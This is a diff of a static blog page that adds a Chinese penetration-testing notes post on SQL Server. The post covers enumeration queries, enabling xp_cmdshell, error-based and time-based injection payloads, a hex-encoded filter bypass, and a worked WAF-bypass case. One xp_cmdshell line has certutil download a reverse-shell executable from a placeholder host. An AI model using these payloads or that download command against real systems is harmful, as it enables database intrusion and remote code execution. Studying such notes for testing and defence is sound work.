@@ -6,17 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="K4ngx.github.io">
-  <title>Archives: 2018 | K4ng&#39;s blog</title>
+  <title>SQL Server 划水水 | K4ng&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="FZU 15级本科生">
-<meta property="og:type" content="website">
-<meta property="og:title" content="K4ng&#39;s blog">
-<meta property="og:url" content="K4ngx.github.io/archives/2018/index.html">
+  <meta name="description" content="在实习的渗透测试项目中，遇到的数据库系统绝大部分是 SQL Server。也算是了解和熟悉 Mssql 的一个重要过程吧。 0x01 基础常用查询12345678910111213-- 查询所有的数据库名SELECT name FROM  master..sysdatabases WHERE name NOT IN ( &apos;master&apos;, &apos;model&apos;, &apos;msdb&apos;, &apos;tempdb&apos;, &apos;n">
+<meta name="keywords" content="sql,Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL Server 划水水">
+<meta property="og:url" content="K4ngx.github.io/2018/08/23/mssql/index.html">
 <meta property="og:site_name" content="K4ng&#39;s blog">
-<meta property="og:description" content="FZU 15级本科生">
+<meta property="og:description" content="在实习的渗透测试项目中，遇到的数据库系统绝大部分是 SQL Server。也算是了解和熟悉 Mssql 的一个重要过程吧。 0x01 基础常用查询12345678910111213-- 查询所有的数据库名SELECT name FROM  master..sysdatabases WHERE name NOT IN ( &apos;master&apos;, &apos;model&apos;, &apos;msdb&apos;, &apos;tempdb&apos;, &apos;n">
+<meta property="og:image" content="https://blog-1252106419.cos.ap-shanghai.myqcloud.com/mssql/0.png">
+<meta property="og:image" content="https://blog-1252106419.cos.ap-shanghai.myqcloud.com/mssql/1.png">
+<meta property="og:image" content="https://blog-1252106419.cos.ap-shanghai.myqcloud.com/mssql/2.png">
+<meta property="og:updated_time" content="2018-08-23T04:43:14.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="K4ng&#39;s blog">
-<meta name="twitter:description" content="FZU 15级本科生">
+<meta name="twitter:title" content="SQL Server 划水水">
+<meta name="twitter:description" content="在实习的渗透测试项目中，遇到的数据库系统绝大部分是 SQL Server。也算是了解和熟悉 Mssql 的一个重要过程吧。 0x01 基础常用查询12345678910111213-- 查询所有的数据库名SELECT name FROM  master..sysdatabases WHERE name NOT IN ( &apos;master&apos;, &apos;model&apos;, &apos;msdb&apos;, &apos;tempdb&apos;, &apos;n">
+<meta name="twitter:image" content="https://blog-1252106419.cos.ap-shanghai.myqcloud.com/mssql/0.png">
   
     <link rel="alternative" href="/atom.xml" title="K4ng&#39;s blog" type="application/atom+xml">
   
@@ -150,36 +156,101 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-mssql" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/08/23/mssql/" class="archive-article-date">
-  	<time datetime="2018-08-23T03:01:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-23</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/08/23/mssql/">SQL Server 划水水</a>
+    <h1 class="article-title" itemprop="name">
+      SQL Server 划水水
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2018/08/23/mssql/" class="archive-article-date">
+  	<time datetime="2018-08-23T03:01:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-23</time>
+</a>
+        
+      </header>
+    
+
+
+    
+        <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
+            <span class="btn-bg"></span>
+            <span class="btn-text">文章导航</span>
+          </p>
+	<div id="toc-article" class="toc-article">
+	    <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
+		<strong class="toc-title">文章目录</strong>
+           <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-基础"><span class="toc-number">1.</span> <span class="toc-text">0x01 基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用查询"><span class="toc-number">1.1.</span> <span class="toc-text">常用查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用内置函数"><span class="toc-number">1.2.</span> <span class="toc-text">常用内置函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#like-查询大小写敏感模式"><span class="toc-number">1.3.</span> <span class="toc-text">like 查询大小写敏感模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实现-limit-m-n"><span class="toc-number">1.4.</span> <span class="toc-text">实现 limit m,n</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-关于xp-cmdshell"><span class="toc-number">2.</span> <span class="toc-text">0x02 关于xp_cmdshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-利用数据类型转换报错注入"><span class="toc-number">3.</span> <span class="toc-text">0x03 利用数据类型转换报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Tricks"><span class="toc-number">4.</span> <span class="toc-text">0x04 Tricks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#set-绕过-select-过滤"><span class="toc-number">4.1.</span> <span class="toc-text">set 绕过 select 过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#有趣的绕过例子"><span class="toc-number">4.2.</span> <span class="toc-text">有趣的绕过例子</span></a></li></ol></li></ol>
+         </div>
+   <script type="text/javascript">
+	function showToc(){
+		var toc_article = document.getElementById("toc-article");
+		var show_toc_btn = document.getElementById("show-toc-btn");
+		toc_article.setAttribute("style","display:block");
+		show_toc_btn.setAttribute("style","display:none");
+		};
+	function showBtn(){
+		var toc_article = document.getElementById("toc-article");
+		var show_toc_btn = document.getElementById("show-toc-btn");
+		toc_article.setAttribute("style","display:none");
+		show_toc_btn.setAttribute("style","display:block");
+		};
+   </script>
+      		
+
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在实习的渗透测试项目中，遇到的数据库系统绝大部分是 SQL Server。也算是了解和熟悉 Mssql 的一个重要过程吧。</p>
+<h2 id="0x01-基础"><a href="#0x01-基础" class="headerlink" title="0x01 基础"></a>0x01 基础</h2><h3 id="常用查询"><a href="#常用查询" class="headerlink" title="常用查询"></a>常用查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">-- 查询所有的数据库名</span></div><div class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span> <span class="keyword">FROM</span>  master..sysdatabases <span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">NOT</span> <span class="keyword">IN</span> ( <span class="string">'master'</span>, <span class="string">'model'</span>, <span class="string">'msdb'</span>, <span class="string">'tempdb'</span>, <span class="string">'northwind'</span>,<span class="string">'pubs'</span> );</div><div class="line"></div><div class="line"><span class="comment">-- 获取某数据库的所有表（假设库名为fooDB）</span></div><div class="line"><span class="comment">-- XType='U':表示所有用户表;</span></div><div class="line"><span class="comment">-- XType='S':表示所有系统表;</span></div><div class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span> <span class="keyword">FROM</span> fooDB..sysobjects <span class="keyword">Where</span> xtype=<span class="string">'U'</span>;</div><div class="line"></div><div class="line"><span class="comment">-- 获取某表所有字段名（假设表名为fooTable）</span></div><div class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span> <span class="keyword">FROM</span> SysColumns <span class="keyword">WHERE</span> <span class="keyword">id</span>=Object_id(<span class="string">'fooTable'</span>);</div><div class="line"></div><div class="line"><span class="comment">-- 延时注入</span></div><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> fooTable <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">1</span> WAITFOR DELAY <span class="string">'0:0:3'</span>;</div></pre></td></tr></table></figure>
+<a id="more"></a>
+<h3 id="常用内置函数"><a href="#常用内置函数" class="headerlink" title="常用内置函数"></a>常用内置函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">db_name() <span class="comment">-- 当前库名</span></div><div class="line">user <span class="comment">-- 当前用户名</span></div><div class="line">suser_name() <span class="comment">-- 登陆用户名</span></div></pre></td></tr></table></figure>
+<h3 id="like-查询大小写敏感模式"><a href="#like-查询大小写敏感模式" class="headerlink" title="like 查询大小写敏感模式"></a><code>like</code> 查询大小写敏感模式</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> dt <span class="keyword">WHERE</span> columnname <span class="keyword">COLLATE</span> Chinese_PRC_CS_AS <span class="keyword">LIKE</span> <span class="string">'aa%'</span>;</div></pre></td></tr></table></figure>
+<ul>
+<li>举例分析 Chinese_PRC_CS_AI_WS<ul>
+<li>前半部份：指 UNICODE 字符集，<code>Chinese_PRC_</code>指针对大陆简体字 UNICODE 的排序规则。</li>
+<li><code>_BIN</code> 二进制排序</li>
+<li><code>_CI(CS)</code> 是否区分大小写，<code>CI</code>不区分，<code>CS</code>区分</li>
+<li><code>_AI(AS)</code> 是否区分重音，<code>AI</code>不区分，<code>AS</code>区分</li>
+<li><code>_KI(KS)</code> 是否区分假名类型，<code>KI</code>不区分，<code>KS</code>区分</li>
+<li><code>_WI(WS)</code> 是否区分宽度，<code>WI</code>不区分，<code>WS</code>区分</li>
+</ul>
+</li>
+</ul>
+<h3 id="实现-limit-m-n"><a href="#实现-limit-m-n" class="headerlink" title="实现 limit m,n"></a>实现 <code>limit m,n</code></h3><p>查询结果中第 7 条到第 9 条记录，如 MySql 中的 <code>limit 7,3</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> top <span class="number">3</span> <span class="keyword">id</span> <span class="keyword">from</span> tablename</div><div class="line"><span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">not</span> <span class="keyword">in</span> (</div><div class="line"><span class="keyword">select</span> top <span class="number">6</span> <span class="keyword">id</span> <span class="keyword">from</span> tablename</div><div class="line">)</div></pre></td></tr></table></figure>
+<h2 id="0x02-关于xp-cmdshell"><a href="#0x02-关于xp-cmdshell" class="headerlink" title="0x02 关于xp_cmdshell"></a>0x02 关于xp_cmdshell</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">-- 开启xp_cmdshell存储过程</span></div><div class="line">EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">', 1;</span></div><div class="line">RECONFIGURE;</div><div class="line">EXEC sp_configure 'xp_cmdshell<span class="string">', 1;</span></div><div class="line">RECONFIGURE;</div><div class="line"></div><div class="line">-- 关闭只需将开启语句的第二个1改成0再执行即可</div><div class="line"></div><div class="line">-- 运行命令</div><div class="line">exec master..xp_cmdshell "whoami";</div><div class="line">exec master..xp_cmdshell "ping 127.0.0.1 -n 5 &gt; nul";</div><div class="line">exec master..xp_cmdshell "certutil -urlcache -split -f http://IP/re_shell.exe D:\re_shell.exe";</div></pre></td></tr></table></figure>
+<p>彻底防御xp_cmdshell方法：修复sql注入漏洞、删除 xplog70.dll 组件</p>
+<h2 id="0x03-利用数据类型转换报错注入"><a href="#0x03-利用数据类型转换报错注入" class="headerlink" title="0x03 利用数据类型转换报错注入"></a>0x03 利用数据类型转换报错注入</h2><ul>
+<li>and 可用：<code>?key=aa&#39;+and+db_name()&gt;1</code></li>
+<li>and 不可用：<code>?key=&#39;%2buser()^1</code></li>
+<li>convert 转换类型：<code>?key=a&#39;%2b(convert(int, @@version))</code></li>
+</ul>
+<h2 id="0x04-Tricks"><a href="#0x04-Tricks" class="headerlink" title="0x04 Tricks"></a>0x04 Tricks</h2><h3 id="set-绕过-select-过滤"><a href="#set-绕过-select-过滤" class="headerlink" title="set 绕过 select 过滤"></a>set 绕过 select 过滤</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">; <span class="keyword">dEcLaRe</span> @s <span class="built_in">vArChAr</span>(<span class="number">8000</span>) <span class="keyword">sEt</span> @s=<span class="number">0x73656c65637420636f6e7665727428696e742c404076657273696f6e29</span> eXeC(@s)<span class="comment">-- -</span></div></pre></td></tr></table></figure>
+<h3 id="有趣的绕过例子"><a href="#有趣的绕过例子" class="headerlink" title="有趣的绕过例子"></a>有趣的绕过例子</h3><p>输入单引号时会报错</p>
+<p><img src="https://blog-1252106419.cos.ap-shanghai.myqcloud.com/mssql/0.png" alt=""></p>
+<p>尝试%23和–+-的注释来判断后端数据库系统类型。语句出错的时候返回200并报错。正确的时候是302。可知为mssql。</p>
+<p>服务端对数据进行了拦截和过滤，拒绝处理请求。然而可利用<code>varchar^int</code>来爆出数据。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?appSysCode='%2buser%5e1<span class="comment">--+-</span></div></pre></td></tr></table></figure>
+<p><img src="https://blog-1252106419.cos.ap-shanghai.myqcloud.com/mssql/1.png" alt=""></p>
+<p>拦截有点厉害。尝试了许多select方式都不行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">?appSysCode=a&apos;%2b(select+&apos;aaa&apos;)--+-</div><div class="line">?appSysCode=a&apos;%2b(select+1)%5e1--+-</div><div class="line">?appSysCode=a&apos;%2b(convert(int,(select+&apos;bbb&apos;)))%5e1--+-（这里只有a报错）</div><div class="line">?appSysCode=a&apos;%2b(convert(varchar,(select+&apos;bbb&apos;)))%5e1--+- （这里直接302）</div><div class="line">?appSysCode=a&apos;%2b(convert(int,(select+&apos;bbb&apos;)))--+-</div><div class="line">?appSysCode=a&apos;%3bSELECT+11--+-</div><div class="line">?appSysCode=a&apos;%3bexec+xxxxx--+-</div></pre></td></tr></table></figure>
+<p>不过还是存在规则缺陷的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?appSysCode=a&apos;%3bselect+*+from+(select+&apos;aaa&apos;+as+c)+t2+where+c%5e1=0--+-</div></pre></td></tr></table></figure>
+<p><img src="https://blog-1252106419.cos.ap-shanghai.myqcloud.com/mssql/2.png" alt=""></p>
+<p>可爆出任意数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?appSysCode=a&apos;%3bSELECT+name+FROM+master..sysdatabases+where+name%5e1%3e0+and+name+NOT+IN+(&apos;master&apos;,&apos;model&apos;,&apos;msdb&apos;,&apos;tempdb&apos;,&apos;northwind&apos;,&apos;pubs&apos;)--+-</div></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -195,372 +266,88 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http:K4ngx.github.io/2018/08/23/mssql/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/05/15/php_win/" class="archive-article-date">
-  	<time datetime="2018-05-14T16:21:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-05-15</time>
-</a>
-        </div>
-    	 
+<nav id="article-nav">
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/05/15/php_win/">php在windows中的目录扫描技巧</a>
-    </h1>
+  
+    <a href="/2018/05/15/php_win/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">php在windows中的目录扫描技巧</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+
+  
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/05/01/Redhat_wp/" class="archive-article-date">
-  	<time datetime="2018-05-01T15:24:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-05-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/05/01/Redhat_wp/">红帽杯2018_Writeup</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/05/01/ddctf/" class="archive-article-date">
-  	<time datetime="2018-05-01T09:29:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-05-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/05/01/ddctf/">DDCTF2018_部分Web_wp</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/30/ciscn2018/" class="archive-article-date">
-  	<time datetime="2018-04-30T07:17:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-30</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/30/ciscn2018/">国赛2018_Run_python继承链bypass</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/25/starctf2018-SimpleWeb-wp/" class="archive-article-date">
-  	<time datetime="2018-04-25T15:43:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-25</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/25/starctf2018-SimpleWeb-wp/">StarCTF2018_SimpleWeb_writeup</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/21/finecms/" class="archive-article-date">
-  	<time datetime="2018-03-21T15:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/21/finecms/">FineCMS v5.3.0 XSS/CSRF</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Vulnerable</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/14/N1CTF2018-Easyphp-WP/" class="archive-article-date">
-  	<time datetime="2018-03-13T17:03:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-14</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/14/N1CTF2018-Easyphp-WP/">N1CTF2018_Easyphp_WP</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/03/04/xxe/" class="archive-article-date">
-  	<time datetime="2018-03-03T18:11:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/03/04/xxe/">浅谈XXE漏洞</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">XXE</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/02/17/pwReset/" class="archive-article-date">
-  	<time datetime="2018-02-17T07:42:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-02-17</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/02/17/pwReset/">十类任意密码重置</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/2018/page/2/">2</a><a class="extend next" rel="next" href="/archives/2018/page/2/">Next &raquo;</a>
-    </nav>
   
 
 
@@ -584,8 +371,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
